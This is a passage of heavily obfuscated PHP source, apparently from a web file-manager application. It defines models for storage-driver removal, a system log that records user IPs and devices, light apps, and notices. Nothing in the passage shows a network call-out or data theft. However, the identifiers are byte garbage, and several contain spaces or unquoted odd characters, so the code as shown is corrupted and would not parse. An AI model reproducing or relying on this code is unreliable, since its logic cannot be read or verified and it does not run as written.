json_decode($×ö½Û„ˆ[$ìªœ îæ[6]], !0); } return $×ö½Û„ˆ; } public function driverInfo($·ÜàÆ’ä) { $ê¤¯Ú• =& $_SERVER[® ¨Ä®ñ]; $µå§êü = array_to_keyvalue(parent::listData(), $ê¤¯Ú•[392]); if (!isset($µå§êü[$·ÜàÆ’ä])) { return !1; } $–©…äÕ§ = $µå§êü[$·ÜàÆ’ä]; $–©…äÕ§[$ê¤¯Ú•[6]] = json_decode($–©…äÕ§[$ê¤¯Ú•[6]], !0); return $–©…äÕ§; } public function remove($‘íñÇåà) { $this->removeShareItems($‘íñÇåà); return parent::remove($‘íñÇåà); } public function removeWithFile($Ó‘Æ¶Š, $¼ÜÛ¶°“) { $ÑÀ”Ş‡– =& $_SERVER[® ¨Ä®ñ]; $ß¥â†½¡ = array($ÑÀ”Ş‡–[799] => $Ó‘Æ¶Š); $ı…ìüç = Model($ÑÀ”Ş‡–[461])->where($ß¥â†½¡)->count(); $¨Ãƒ¤” = Model($ÑÀ”Ş‡–[461])->where($ß¥â†½¡)->sum($ÑÀ”Ş‡–[80]); $×ï¼“¯å = $¼ÜÛ¶°“ . $ÑÀ”Ş‡–[2120] . $Ó‘Æ¶Š; $˜°á¼Ú = new TaskFileTransfer($×ï¼“¯å, $ÑÀ”Ş‡–[2116], $ı…ìüç, LNG($ÑÀ”Ş‡–[2121]) . "\x28{$Ó‘Æ¶Š}\x29"); $˜°á¼Ú->task[$ÑÀ”Ş‡–[745]] = (double) $¨Ãƒ¤”; $Øêºú§ = KodIO::defaultDriver(); $°¬üêÇÃ = $Øêºú§[$ÑÀ”Ş‡–[392]]; $¤šÆ ®Ã = "\173\151\x6f\x3a{$°¬üêÇÃ}\x7d\57"; $¸¡˜ËÒ™ = !0; $É»åƒ = array(); $Èáó¶¾‹ = Model($ÑÀ”Ş‡–[192])->where($ß¥â†½¡)->field($ÑÀ”Ş‡–[2122])->select(); foreach ($Èáó¶¾‹ as $­€éÈòÜ) { $ûŞÕ ™‡ = $­€éÈòÜ[$ÑÀ”Ş‡–[78]]; $è²áõš÷ = $¤šÆ ®Ã . str_replace("\x7b\x69\157\x3a{$Ó‘Æ¶Š}\175\57", $ÑÀ”Ş‡–[12], $ûŞÕ ™‡); if (!IO::exist($ûŞÕ ™‡)) { $É»åƒ[] = $­€éÈòÜ[$ÑÀ”Ş‡–[458]]; $˜°á¼Ú->updateFileEnd($­€éÈòÜ[$ÑÀ”Ş‡–[32]], $­€éÈòÜ[$ÑÀ”Ş‡–[80]]); continue; } if (IO::exist($è²áõš÷)) { $˜°á¼Ú->updateFileEnd($­€éÈòÜ[$ÑÀ”Ş‡–[32]], $­€éÈòÜ[$ÑÀ”Ş‡–[80]]); continue; } if (!IO::move($ûŞÕ ™‡, get_path_father($è²áõš÷))) { $¸¡˜ËÒ™ = !1; break; } $ß¥â†½¡ = array($ÑÀ”Ş‡–[458] => $­€éÈòÜ[$ÑÀ”Ş‡–[458]]); $ö½áƒà = array($ÑÀ”Ş‡–[799] => $°¬üêÇÃ, $ÑÀ”Ş‡–[78] => $è²áõš÷); Model($ÑÀ”Ş‡–[192])->where($ß¥â†½¡)->save($ö½áƒà); } $this->removeByFileID($É»åƒ); if (!$¸¡˜ËÒ™) { $˜°á¼Ú->stop($×ï¼“¯å); return !1; } $˜°á¼Ú->end(); if ($¼ÜÛ¶°“ == $ÑÀ”Ş‡–[1776]) { $this->remove($Ó‘Æ¶Š); } } public function progress($ØÊ¡«æ˜, $²àÕÜı‰) { return Task::get($²àÕÜı‰ . $_SERVER[® ¨Ä®ñ][2120] . $ØÊ¡«æ˜); } private function removeByFileID($­ØŠÊö… = array()) { $â“·û®Û =& $_SERVER[® ¨Ä®ñ]; if (empty($­ØŠÊö…)) { return; } $ñ§§àÀ† = array($â“·û®Û[458] => array($â“·û®Û[7], $­ØŠÊö…)); $ÃÑ†Ø³ô = Model($â“·û®Û[1309])->where($ñ§§àÀ†)->field($â“·û®Û[394])->select(); if (!$ÃÑ†Ø³ô) { return; } $ÃÑ†Ø³ô = array_to_keyvalue($ÃÑ†Ø³ô, $â“·û®Û[12], $â“·û®Û[394]); foreach ($ÃÑ†Ø³ô as $ƒÁ²ûÌö) { Model($â“·û®Û[408])->removeNow($ƒÁ²ûÌö, !1); } } private function removeShareItems($¿³½¸ª±) { $éÖ§®Ù =& $_SERVER[® ¨Ä®ñ]; $¤íôóÔ– = "\173\x69\x6f\72{$¿³½¸ª±}\175\57"; $ÇèßˆŞæ = array($éÖ§®Ù[394] => 0, $éÖ§®Ù[1158] => array($éÖ§®Ù[378], "{$¤íôóÔ–}\x25")); $Åìş†»â = Model($éÖ§®Ù[1787])->where($ÇèßˆŞæ)->field($éÖ§®Ù[479])->select(); if (empty($Åìş†»â)) { return; } $÷õñçÃ = array_to_keyvalue($Åìş†»â, $éÖ§®Ù[12], $éÖ§®Ù[479]); Model($éÖ§®Ù[586])->remove($÷õñçÃ); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\155\56\114\151\x67\150\164\101\160\x70"; public $modelType = "\123\171\x73\x74\x65\155\117\x70\164\151\157\156"; public $field = array("\156\x61\x6d\145", "\147\162\x6f\x75\160", "\x64\x65\163\x63", "\143\157\156\164\x65\156\164"); public function listData($ªêªŸßì = false, $ãÆ»Ñë” = "\155\157\x64\x69\x66\x79\124\151\155\145", $à³¡Ğ‰Ø = true) { return parent::listData($ªêªŸßì, $ãÆ»Ñë”, $à³¡Ğ‰Ø); } public function remove($Îüßƒ–) { $ÊªÙœ‰ = $this->findByName($Îüßƒ–); if (!$ÊªÙœ‰) { return !1; } return parent::remove($ÊªÙœ‰[$_SERVER[® ¨Ä®ñ][392]]); } public function add($Áˆ‹¥Òº) { if ($this->findByName($Áˆ‹¥Òº[$_SERVER[® ¨Ä®ñ][32]])) { return !1; } return parent::insert($Áˆ‹¥Òº); } public function update($ ¢‹à“, $Õ°¸’°ª) { $ïëé§Ü =& $_SERVER[® ¨Ä®ñ]; $Á¥äÙÆÂ = $this->findByName($ ¢‹à“); $ñ÷œëå = $this->findByName($Õ°¸’°ª[$ïëé§Ü[32]]); if (!$Á¥äÙÆÂ || $ñ÷œëå && $ñ÷œëå[$ïëé§Ü[392]] != $Á¥äÙÆÂ[$ïëé§Ü[392]]) { return !1; } return parent::update($Á¥äÙÆÂ[$ïëé§Ü[392]], $Õ°¸’°ª); } } goto B¶·½‚ëÉ¬; aÄïßÀ—‚†: define($_SERVER[® ¨Ä®ñ][236], 1); define($_SERVER[® ¨Ä®ñ][237], 0); define($_SERVER[® ¨Ä®ñ][238], 2); goto Fò¹Œª©ó; B¶·½‚ëÉ¬: class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\163\164\x65\155\x5f\154\157\x67"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\x65\x54\151\155\145", "\x74\151\155\x65", "\151\x6e\163\x65\x72\164", "\x66\x75\x6e\x63\164\x69\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $˜×„’¾‹ =& $_SERVER[® ¨Ä®ñ]; return array($˜×„’¾‹[2123] => LNG($˜×„’¾‹[2124]), $˜×„’¾‹[2125] => LNG($˜×„’¾‹[2126]), $˜×„’¾‹[1750] => LNG($˜×„’¾‹[2127]), $˜×„’¾‹[2128] => LNG($˜×„’¾‹[2129]), $˜×„’¾‹[2130] => LNG($˜×„’¾‹[2131]), $˜×„’¾‹[2132] => LNG($˜×„’¾‹[2133]), $˜×„’¾‹[2134] => LNG($˜×„’¾‹[2135]), $˜×„’¾‹[1780] => LNG($˜×„’¾‹[2135]), $˜×„’¾‹[1781] => LNG($˜×„’¾‹[2136]), $˜×„’¾‹[2137] => LNG($˜×„’¾‹[2138]), $˜×„’¾‹[2139] => LNG($˜×„’¾‹[2140]), $˜×„’¾‹[2141] => LNG($˜×„’¾‹[2142]), $˜×„’¾‹[2143] => LNG($˜×„’¾‹[2144]), $˜×„’¾‹[1778] => LNG($˜×„’¾‹[2145]), $˜×„’¾‹[2146] => LNG($˜×„’¾‹[2147]), $˜×„’¾‹[1785] => LNG($˜×„’¾‹[2148]), $˜×„’¾‹[2149] => LNG($˜×„’¾‹[2150]), $˜×„’¾‹[2151] => LNG($˜×„’¾‹[2152]), $˜×„’¾‹[2153] => LNG($˜×„’¾‹[2154]), $˜×„’¾‹[2155] => LNG($˜×„’¾‹[2156]), $˜×„’¾‹[1788] => LNG($˜×„’¾‹[2157]), $˜×„’¾‹[1789] => LNG($˜×„’¾‹[2158]), $˜×„’¾‹[2159] => LNG($˜×„’¾‹[2160]), $˜×„’¾‹[2161] => LNG($˜×„’¾‹[2162]), $˜×„’¾‹[2163] => LNG($˜×„’¾‹[2164]), $˜×„’¾‹[1783] => LNG($˜×„’¾‹[2165]), $˜×„’¾‹[2166] => LNG($˜×„’¾‹[2167]), $˜×„’¾‹[1782] => LNG($˜×„’¾‹[2168]), $˜×„’¾‹[2169] => LNG($˜×„’¾‹[2170]), $˜×„’¾‹[2171] => LNG($˜×„’¾‹[2172]), $˜×„’¾‹[2173] => LNG($˜×„’¾‹[2174]), $˜×„’¾‹[2175] => LNG($˜×„’¾‹[2175]), $˜×„’¾‹[2176] => LNG($˜×„’¾‹[1754]), $˜×„’¾‹[2177] => LNG($˜×„’¾‹[2178]), $˜×„’¾‹[2179] => LNG($˜×„’¾‹[2180]), $˜×„’¾‹[2181] => LNG($˜×„’¾‹[2182]), $˜×„’¾‹[2183] => LNG($˜×„’¾‹[2184]), $˜×„’¾‹[2185] => LNG($˜×„’¾‹[2186]), $˜×„’¾‹[2187] => LNG($˜×„’¾‹[2187]), $˜×„’¾‹[2188] => LNG($˜×„’¾‹[2189]), $˜×„’¾‹[2190] => LNG($˜×„’¾‹[2191]), $˜×„’¾‹[2192] => LNG($˜×„’¾‹[2193]), $˜×„’¾‹[2194] => LNG($˜×„’¾‹[2195]), $˜×„’¾‹[2196] => LNG($˜×„’¾‹[2197]), $˜×„’¾‹[2198] => LNG($˜×„’¾‹[2199])); } private function typeFile() { $ğø¾µ»ï =& $_SERVER[® ¨Ä®ñ]; $äñÖ¯µÌ = array($ğø¾µ»ï[1785] => array($ğø¾µ»ï[1786]), $ğø¾µ»ï[2141] => array($ğø¾µ»ï[2200]), $ğø¾µ»ï[2143] => array($ğø¾µ»ï[2201]), $ğø¾µ»ï[1778] => array($ğø¾µ»ï[1779]), $ğø¾µ»ï[2151] => array(), $ğø¾µ»ï[2153] => array(), $ğø¾µ»ï[2155] => array(), $ğø¾µ»ï[1788] => array($ğø¾µ»ï[1790]), $ğø¾µ»ï[1789] => array($ğø¾µ»ï[1790]), $ğø¾µ»ï[2159] => array($ğø¾µ»ï[2202]), $ğø¾µ»ï[2161] => array($ğø¾µ»ï[2202]), $ğø¾µ»ï[2163] => array($ğø¾µ»ï[2203]), $ğø¾µ»ï[2149] => array($ğø¾µ»ï[2204]), $ğø¾µ»ï[1783] => array($ğø¾µ»ï[2205]), $ğø¾µ»ï[2166] => array($ğø¾µ»ï[2206]), $ğø¾µ»ï[1782] => array($ğø¾µ»ï[1784])); return $äñÖ¯µÌ; } private function typeAll() { $ÚéÉ—æ˜ =& $_SERVER[® ¨Ä®ñ]; $®–ˆ®úÚ = $this->typeList; $·Í”é×â = array_filter($this->typeFile()); foreach ($·Í”é×â as $ûŠêÅÆ => $øá§¥İø) { $®–ˆ®úÚ[$øá§¥İø[0]] = $®–ˆ®úÚ[$ûŠêÅÆ]; } $®–ˆ®úÚ[$ÚéÉ—æ˜[1790]] = LNG($ÚéÉ—æ˜[2207]); $®–ˆ®úÚ[$ÚéÉ—æ˜[2202]] = LNG($ÚéÉ—æ˜[2208]); return $®–ˆ®úÚ; } public function addLog($ç‘‰®Ì, $ï¹º¶Î¦ = array()) { $÷°š±âº =& $_SERVER[® ¨Ä®ñ]; if (!isset($this->typeList[$ç‘‰®Ì])) { return; } $à©ƒ…¸ı = defined($÷°š±âº[465]) && USER_ID ? USER_ID : (isset($ï¹º¶Î¦[$÷°š±âº[1639]]) ? $ï¹º¶Î¦[$÷°š±âº[1639]] : 0); if (!$à©ƒ…¸ı) { $à©ƒ…¸ı = (int) Session::get($÷°š±âº[1939]); } $¦Áâ¾€Ø = get_client_ip(); if (!$ï¹º¶Î¦ || strlen(json_encode($ï¹º¶Î¦)) >= 1024) { $ï¹º¶Î¦ = array($÷°š±âº[2209] => $¦Áâ¾€Ø); } else { if (is_array($ï¹º¶Î¦)) { $ï¹º¶Î¦[$÷°š±âº[2209]] = $¦Áâ¾€Ø; } else { $ï¹º¶Î¦ = array($÷°š±âº[1175] => $ï¹º¶Î¦, $÷°š±âº[2209] => $¦Áâ¾€Ø); } } $ï¹º¶Î¦ = array($÷°š±âº[1629] => Session::sign(), $÷°š±âº[1630] => $à©ƒ…¸ı, $÷°š±âº[33] => $ç‘‰®Ì, $÷°š±âº[1632] => json_encode($ï¹º¶Î¦)); parent::add($ï¹º¶Î¦); } public function remove($µ¶º¤üç) { $this->where(array($_SERVER[® ¨Ä®ñ][411] => $µ¶º¤üç))->delete(); } private function _makeOrder($ó‹ì÷ = '') { $Ïšğ¦˜ñ =& $_SERVER[® ¨Ä®ñ]; $€²şÜğÀ = $Ïšğ¦˜ñ[193]; $Àú£îÓ¸ = array($Ïšğ¦˜ñ[439] => $Ïšğ¦˜ñ[440], $Ïšğ¦˜ñ[441] => $Ïšğ¦˜ñ[442]); $°é‘Ò³ = Input::get($Ïšğ¦˜ñ[447], $Ïšğ¦˜ñ[7], $Ïšğ¦˜ñ[1971], array($Ïšğ¦˜ñ[1897], $Ïšğ¦˜ñ[441])); $°é‘Ò³ = $Àú£îÓ¸[$°é‘Ò³]; $ó‹ì÷ = $ó‹ì÷ . "{$€²şÜğÀ}\40{$°é‘Ò³}"; return $this->order($ó‹ì÷); } public function get($¢·ô¦Œ² = '') { $ºãó¼˜à =& $_SERVER[® ¨Ä®ñ]; if (!$¢·ô¦Œ²) { show_json(array()); } $ØÙÉÁñ = array(); if ($¢·ô¦Œ²[$ºãó¼˜à[1639]]) { $ØÙÉÁñ[$ºãó¼˜à[1639]] = $¢·ô¦Œ²[$ºãó¼˜à[1639]]; } if (isset($¢·ô¦Œ²[$ºãó¼˜à[743]])) { $å¦îÃ½š = $¢·ô¦Œ²[$ºãó¼˜à[743]]; $¬œ•çÍ” = isset($¢·ô¦Œ²[$ºãó¼˜à[487]]) ? $¢·ô¦Œ²[$ºãó¼˜à[487]] : time(); $ØÙÉÁñ[$ºãó¼˜à[193]] = array($ºãó¼˜à[328], array($å¦îÃ½š, $¬œ•çÍ”)); } if ($¢·ô¦Œ²[$ºãó¼˜à[33]]) { $ªóÙËö† = explode($ºãó¼˜à[50], $¢·ô¦Œ²[$ºãó¼˜à[33]]); $’ˆˆÖÂ“ = $this->typeFile(); $¿Å»«’û = array(); foreach ($ªóÙËö† as $¯ˆ±üÉÔ) { $¿Å»«’û[] = $¯ˆ±üÉÔ; if (isset($’ˆˆÖÂ“[$¯ˆ±üÉÔ])) { $¿Å»«’û = array_merge($¿Å»«’û, $’ˆˆÖÂ“[$¯ˆ±üÉÔ]); } } $¿Å»«’û = array_unique($¿Å»«’û); if ($¿Å»«’û) { $ØÙÉÁñ[$ºãó¼˜à[33]] = array($ºãó¼˜à[7], $¿Å»«’û); } } else { $ØÙÉÁñ[$ºãó¼˜à[33]] = array($ºãó¼˜à[2210], $ºãó¼˜à[2211]); } if (!empty($¢·ô¦Œ²[$ºãó¼˜à[2209]])) { $ØÙÉÁñ[$ºãó¼˜à[442]] = array($ºãó¼˜à[378], "\45{$¢·ô¦Œ²[$ºãó¼˜à[2209]]}\45"); } $š¾ïÈÒõ = $this->_makeOrder()->where($ØÙÉÁñ)->selectPage(); if (empty($š¾ïÈÒõ[$ºãó¼˜à[364]])) { show_json(array(), !0, $š¾ïÈÒõ[$ºãó¼˜à[361]]); } $š¾ïÈÒõ[$ºãó¼˜à[364]] = $this->logList($š¾ïÈÒõ[$ºãó¼˜à[364]]); return $š¾ïÈÒõ; } private function ipAddress(&$·ƒ²ü«) { $²õŒÏĞÁ =& $_SERVER[® ¨Ä®ñ]; if (!empty($·ƒ²ü«[$²õŒÏĞÁ[2209]])) { $øÏ§Û³ = IpLocation::get($·ƒ²ü«[$²õŒÏĞÁ[2209]]); } else { $øÏ§Û³ = LNG($²õŒÏĞÁ[2212]); } $·ƒ²ü«[$²õŒÏĞÁ[2213]] = $øÏ§Û³; } private function descZipDownload($•ËÑÒßš, &$ı‡Œ‰â÷) { $óêî¤³ =& $_SERVER[® ¨Ä®ñ]; if (!isset($•ËÑÒßš[$óêî¤³[2214]])) { return; } $Š®Îîß = json_decode($•ËÑÒßš[$óêî¤³[2214]], !0); foreach ($Š®Îîß as $ˆ¾ù½ùŸ) { try { $ş‰¾âÀ = IO::infoFull($ˆ¾ù½ùŸ[$óêî¤³[78]]); } catch (Exception $¹®ëÄ–Â) { continue; } $•ËÑÒßš[$óêî¤³[78]] = $ˆ¾ù½ùŸ[$óêî¤³[78]]; $ı‡Œ‰â÷[] = $•ËÑÒßš[$óêî¤³[394]] = $ş‰¾âÀ[$óêî¤³[394]]; $ı‡Œ‰â÷[] = $•ËÑÒßš[$óêî¤³[2025]] = $ş‰¾âÀ[$óêî¤³[489]]; break; } return $•ËÑÒßš; } private function getSourceList(&$¬¬Ã³†õ) { $ğØ†¸Ö =& $_SERVER[® ¨Ä®ñ]; $ÍÕÚŠ¹ = array(); foreach ($¬¬Ã³†õ as $òÂ±ù¸á => $—ÊÙ¤Äœ) { $éØ—‡ƒó = json_decode($—ÊÙ¤Äœ[$ğØ†¸Ö[442]], !0); if ($—ÊÙ¤Äœ[$ğØ†¸Ö[33]] == $ğØ†¸Ö[1781]) { $éØ—‡ƒó = $this->descZipDownload($éØ—‡ƒó, $ÍÕÚŠ¹); $¬¬Ã³†õ[$òÂ±ù¸á][$ğØ†¸Ö[442]] = json_encode($éØ—‡ƒó); continue; } if (strpos($—ÊÙ¤Äœ[$ğØ†¸Ö[33]], $ğØ†¸Ö[2027]) !== 0) { if (!isset($éØ—‡ƒó[$ğØ†¸Ö[78]]) || strpos($—ÊÙ¤Äœ[$ğØ†¸Ö[33]], $ğØ†¸Ö[2215]) !== 0) { continue; } try { $íûÅœÙ† = IO::infoFull($éØ—‡ƒó[$ğØ†¸Ö[78]]); } catch (Exception $°ä€ëóâ) { continue; } $ÍÕÚŠ¹[] = $éØ—‡ƒó[$ğØ†¸Ö[394]] = $íûÅœÙ†[$ğØ†¸Ö[394]]; $ÍÕÚŠ¹[] = $éØ—‡ƒó[$ğØ†¸Ö[2025]] = $íûÅœÙ†[$ğØ†¸Ö[489]]; $¬¬Ã³†õ[$òÂ±ù¸á][$ğØ†¸Ö[442]] = json_encode($éØ—‡ƒó); continue; } $ÍÕÚŠ¹[] = $éØ—‡ƒó[$ğØ†¸Ö[394]]; $ÍÕÚŠ¹[] = $éØ—‡ƒó[$ğØ†¸Ö[2025]]; if ($éØ—‡ƒó[$ğØ†¸Ö[33]] == $ğØ†¸Ö[542]) { $ÍÕÚŠ¹[] = $éØ—‡ƒó[$ğØ†¸Ö[442]][$ğØ†¸Ö[1142]]; $ÍÕÚŠ¹[] = $éØ—‡ƒó[$ğØ†¸Ö[442]][$ğØ†¸Ö[1143]]; } if ($éØ—‡ƒó[$ğØ†¸Ö[33]] == $ğØ†¸Ö[2034]) { $ÍÕÚŠ¹[] = $éØ—‡ƒó[$ğØ†¸Ö[442]][$ğØ†¸Ö[394]]; } } if (!$ÍÕÚŠ¹) { return array(); } return Model($ğØ†¸Ö[807])->sourceListInfo($ÍÕÚŠ¹, !0); } private function logList($Ññ¤Â…) { $¼àš•Ú³ =& $_SERVER[® ¨Ä®ñ]; $ñ£éÕ‰õ = array_to_keyvalue($Ññ¤Â…, $¼àš•Ú³[12], $¼àš•Ú³[1639]); $Òà­ôÛ = Model($¼àš•Ú³[529])->userListInfo(array_unique($ñ£éÕ‰õ)); $â§ı«ËÑ = $this->getSourceList($Ññ¤Â…); $‘ŞéáæÕ = $this->typeAll(); $Ù¦½“¾Î = array(); $‰‹›§£® = array(); foreach ($Ññ¤Â… as $–ûòª’š => $€ÚÓñ™î) { $†îºşı = $€ÚÓñ™î[$¼àš•Ú³[33]]; $„Øõ™Ä = isset($Òà­ôÛ[$€ÚÓñ™î[$¼àš•Ú³[1639]]]) ? $Òà­ôÛ[$€ÚÓñ™î[$¼àš•Ú³[1639]]] : !1; $šÉ®à– = strpos($†îºşı, $¼àš•Ú³[2216]) === 0 ? LNG($¼àš•Ú³[2217]) : LNG($¼àš•Ú³[2212]); $€ÚÓñ™î[$¼àš•Ú³[32]] = isset($„Øõ™Ä[$¼àš•Ú³[32]]) ? $„Øõ™Ä[$¼àš•Ú³[32]] : LNG($¼àš•Ú³[2212]); $€ÚÓñ™î[$¼àš•Ú³[2075]] = isset($„Øõ™Ä[$¼àš•Ú³[2075]]) ? $„Øõ™Ä[$¼àš•Ú³[2075]] : $¼àš•Ú³[12]; $€ÚÓñ™î[$¼àš•Ú³[1539]] = isset($‘ŞéáæÕ[$†îºşı]) ? $‘ŞéáæÕ[$†îºşı] : $šÉ®à–; $€ÚÓñ™î[$¼àš•Ú³[1970]] = $„Øõ™Ä; $Šàˆî = json_decode($€ÚÓñ™î[$¼àš•Ú³[442]], !0); $€ÚÓñ™î[$¼àš•Ú³[2209]] = isset($Šàˆî[$¼àš•Ú³[2209]]) ? $Šàˆî[$¼àš•Ú³[2209]] : $¼àš•Ú³[12]; $€ÚÓñ™î[$¼àš•Ú³[2213]] = IpLocation::get($€ÚÓñ™î[$¼àš•Ú³[2209]]); if (strpos($†îºşı, $¼àš•Ú³[2027]) === 0 || isset($Šàˆî[$¼àš•Ú³[2025]])) { $Šàˆî[$¼àš•Ú³[87]] = $â§ı«ËÑ[$Šàˆî[$¼àš•Ú³[394]]]; $Šàˆî[$¼àš•Ú³[2039]] = $â§ı«ËÑ[$Šàˆî[$¼àš•Ú³[2025]]]; if ($Šàˆî[$¼àš•Ú³[33]] == $¼àš•Ú³[542]) { $Šàˆî[$¼àš•Ú³[442]][$¼àš•Ú³[1142]] = $â§ı«ËÑ[$Šàˆî[$¼àš•Ú³[442]][$¼àš•Ú³[1142]]]; $Šàˆî[$¼àš•Ú³[442]][$¼àš•Ú³[1143]] = $â§ı«ËÑ[$Šàˆî[$¼àš•Ú³[442]][$¼àš•Ú³[1143]]]; } if ($Šàˆî[$¼àš•Ú³[33]] == $¼àš•Ú³[2034]) { $Šàˆî[$¼àš•Ú³[442]][$¼àš•Ú³[394]] = $â§ı«ËÑ[$Šàˆî[$¼àš•Ú³[442]][$¼àš•Ú³[394]]]; } if ($Šàˆî[$¼àš•Ú³[33]] == $¼àš•Ú³[1776]) { $Šàˆî[$¼àš•Ú³[2039]] = $Šàˆî[$¼àš•Ú³[87]]; $Šàˆî[$¼àš•Ú³[2025]] = $Šàˆî[$¼àš•Ú³[2039]][$¼àš•Ú³[394]]; $Šàˆî[$¼àš•Ú³[87]] = !1; $Šàˆî[$¼àš•Ú³[394]] = $¼àš•Ú³[12]; } if ($Šàˆî[$¼àš•Ú³[87]] && $Šàˆî[$¼àš•Ú³[87]][$¼àš•Ú³[403]] == $¼àš•Ú³[1258]) { $‰‹›§£®[] = $€ÚÓñ™î[$¼àš•Ú³[392]]; unset($Ññ¤Â…[$–ûòª’š]); continue; } if ($Šàˆî[$¼àš•Ú³[2039]] && $Šàˆî[$¼àš•Ú³[2039]][$¼àš•Ú³[403]] == $¼àš•Ú³[1258]) { $‰‹›§£®[] = $€ÚÓñ™î[$¼àš•Ú³[392]]; unset($Ññ¤Â…[$–ûòª’š]); continue; } } $€ÚÓñ™î[$¼àš•Ú³[442]] = $Šàˆî; unset($€ÚÓñ™î[$¼àš•Ú³[2218]]); $Ù¦½“¾Î[] = $€ÚÓñ™î; } $this->clearSystemPathLog($‰‹›§£®); return $Ù¦½“¾Î; } private function clearSystemPathLog($ŠûÕ©˜²) { $ï¹òß =& $_SERVER[® ¨Ä®ñ]; if (count($ŠûÕ©˜²) == 0) { return; } $¡²‰™ŠĞ = array($ï¹òß[392] => array($ï¹òß[7], array_unique($ŠûÕ©˜²))); $this->where($¡²‰™ŠĞ)->delete(); } public function deviceList($«ÒØßœ¾, $ÛÈ©˜ï¦ = 0) { $‹÷¡©ü =& $_SERVER[® ¨Ä®ñ]; $Íó÷€¼ = array($‹÷¡©ü[1639] => $«ÒØßœ¾, $‹÷¡©ü[193] => array($‹÷¡©ü[998], $ÛÈ©˜ï¦), $‹÷¡©ü[33] => $‹÷¡©ü[1750]); $Ÿƒ¡ş“¢ = array(); $•È¹Î…µ = $this->field($‹÷¡©ü[2219])->where($Íó÷€¼)->order($‹÷¡©ü[2037])->limit(50)->select(); foreach ($•È¹Î…µ as $Ú£”ï· => $İñì†¤”) { if ($Ú£”ï· > 0 && abs($İñì†¤”[$‹÷¡©ü[193]] - $•È¹Î…µ[$Ú£”ï· - 1][$‹÷¡©ü[193]]) < 5) { continue; } $‘àşíÏŸ = json_decode($İñì†¤”[$‹÷¡©ü[442]], !0); $İñì†¤”[$‹÷¡©ü[2209]] = isset($‘àşíÏŸ[$‹÷¡©ü[2209]]) ? $‘àşíÏŸ[$‹÷¡©ü[2209]] : $‹÷¡©ü[12]; unset($‘àşíÏŸ[$‹÷¡©ü[2209]]); $°„Ú¦—‘ = $this->deviceType($‘àşíÏŸ[$‹÷¡©ü[2028]]); if (isset($Ÿƒ¡ş“¢[$°„Ú¦—‘])) { continue; } $İñì†¤”[$‹÷¡©ü[2213]] = IpLocation::get($İñì†¤”[$‹÷¡©ü[2209]]); $İñì†¤”[$‹÷¡©ü[442]] = $‘àşíÏŸ; $Ÿƒ¡ş“¢[$°„Ú¦—‘] = $İñì†¤”; } return array_values($Ÿƒ¡ş“¢); } public function deviceType($ø·…ŞÅ¼) { return $ø·…ŞÅ¼; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\x2e\x6e\x6f\x74\x69\143\x65\x4c\x69\x73\x74"; public $field = array("\x6e\141\x6d\x65", "\143\x6f\156\x74\145\156\164", "\141\x75\164\150", "\x6d\157\x64\145", "\164\151\x6d\145", "\x74\171\160\x65", "\x6c\x65\166\145\x6c", "\145\x6e\x61\x62\x6c\x65", "\x73\157\162\x74"); public function listData($‹Ü«¦Ü = false, $ÃÖÕŒÖŸ = "\163\x6f\162\x74", $ÖÆï·‡ = false) { return parent::listData($‹Ü«¦Ü, $ÃÖÕŒÖŸ, $ÖÆï·‡); } public function add($Â‘ã€Å) { $òŸØÕÑ =& $_SERVER[® ¨Ä®ñ]; $†”óŞ = time(); if ($Â‘ã€Å[$òŸØÕÑ[16]] == $òŸØÕÑ[2220]) { $†”óŞ = strtotime($Â‘ã€Å[$òŸØÕÑ[196]]); } $Â‘ã€Å[$òŸØÕÑ[196]] = $†”óŞ; return parent::insert($Â‘ã€Å); } public function update($ôªŸíñ‡, $‰€ãôâü) { $°úæş«Ï =& $_SERVER[® ¨Ä®ñ]; $éÌ„ÃÇ = $this->listData($ôªŸíñ‡); if (!$éÌ„ÃÇ) { return !1; } $“³„Ü˜İ = time(); if ($‰€ãôâü[$°úæş«Ï[16]] == $°úæş«Ï[2220]) { $“³„Ü˜İ = strtotime($‰€ãôâü[$°úæş«Ï[196]]); } $‰€ãôâü[$°úæş«Ï[196]] = $“³„Ü˜İ; return parent::update($ôªŸíñ‡, $‰€ãôâü); } public function remove($º—¿¨Á«) { $İÁ« ö¬ = $this->listData($º—¿¨Á«); if (!$İÁ« ö¬ || $İÁ« ö¬[$_SERVER[® ¨Ä®ñ][1258]]) { return !1; } return parent::remove($º—¿¨Á«); } public function sort($Òçàó–, $Õ¢–Ñ†Ö) { return parent::update($Òçàó–, $Õ¢–Ñ†Ö); } public function enable($·¸Äıæğ, $«‡­æ¬) { return parent::update($·¸Äıæğ, array($_SERVER[® ¨Ä®ñ][2221] => $«‡­æ¬)); } private function initUserOption() { $í¨†¢³â =& $_SERVER[® ¨Ä®ñ]; $this->optionType = $í¨†¢³â[2222]; $this->modelType = $í¨†¢³â[2223]; $this->field = array($í¨†¢³â[2224], $í¨†¢³â[32], $í¨†¢³â[196], $í¨†¢³â[33], $í¨†¢³â[2225], $í¨†¢³â[732], $í¨†¢³â[188]); } public function userNoticeGet($Íİô§‚¡ = false) { $this->initUserOption(); return parent::listData($Íİô§‚¡, $_SERVER[® ¨Ä®ñ][392], !0); } public function userNoticeAdd($Ô¯ƒĞ¾Å) { $ã´–İ•š =& $_SERVER[® ¨Ä®ñ]; $this->initUserOption(); $óÒßéËë = $this->findByKey($ã´–İ•š[2224], $Ô¯ƒĞ¾Å[$ã´–İ•š[392]]); if ($óÒßéËë) { return !0; } $ˆèï­¢“ = array($ã´–İ•š[2224] => $Ô¯ƒĞ¾Å[$ã´–İ•š[392]], $ã´–İ•š[32] => $Ô¯ƒĞ¾Å[$ã´–İ•š[32]], $ã´–İ•š[196] => $Ô¯ƒĞ¾Å[$ã´–İ•š[196]], $ã´–İ•š[33] => isset($Ô¯ƒĞ¾Å[$ã´–İ•š[33]]) ? $Ô¯ƒĞ¾Å[$ã´–İ•š[33]] : 1, $ã´–İ•š[2225] => isset($Ô¯ƒĞ¾Å[$ã´–İ•š[2225]]) ? $Ô¯ƒĞ¾Å[$ã´–İ•š[2225]] : 0, $ã´–İ•š[732] => 0, $ã´–İ•š[188] => 0); return parent::insert($ˆèï­¢“); } public function userNoticeEdit($œë‹ø’˜, $ÓÚòĞ˜é) { $this->initUserOption(); return parent::update($œë‹ø’˜, 